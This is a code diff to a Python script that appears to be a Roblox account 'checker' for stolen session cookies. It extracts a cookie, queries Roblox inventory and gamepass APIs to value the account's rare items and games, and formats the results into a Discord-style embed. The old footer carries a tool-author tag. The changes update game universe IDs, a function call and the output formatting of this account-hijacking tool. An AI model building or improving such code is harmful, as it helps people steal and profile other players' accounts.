@@ -36,11 +36,11 @@ SPECIAL_ASSETS = {
     "Violet Valk": 1402432199,
 }
 
-# Games mapped to universe IDs
+# Verified games mapped to universe IDs
 GAMES = {
-    "Adopt Me": 383310974,
-    "MM2": 142823291,
-    "PS99": 3259657279,
+    "adopt me": 383310974,
+    "mm2": 66654135,
+    "ps99": 3317771874,
 }
 
 def extract_and_clean_cookie(raw_input):
@@ -255,10 +255,10 @@ def main():
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                     special_owned[item_name] = bool(asset_res and asset_res.get("data"))
 
-                # 5. Full game & gamepass scanning loop (fixed matching your logic)
+                # 5. Full game & gamepass scanning loop
                 for game_name, universe_id in GAMES.items():
                     played = has_played(session, user_id, universe_id)
-                    passes = get_game_passes(universe_id)
+                    passes = get_game_passes(session, universe_id)
                     owned_passes = sum(1 for p in passes if owns_pass(session, user_id, p))
                     
                     if owned_passes > 0:
@@ -273,7 +273,7 @@ def main():
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
         
-        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
+        games_str = "\n".join([f"- {g.title()} : {d['played']} : ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
         special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"
 
         embed_stats = {
@@ -289,7 +289,7 @@ def main():
                 {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
                 {"name": "⭐ Games", "value": f"```diff\n{games_str}\n```", "inline": False}
             ],
-            "footer": {"text": f"_bfz_ on top | astrox+ • {_bfz_}"},
+            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
 
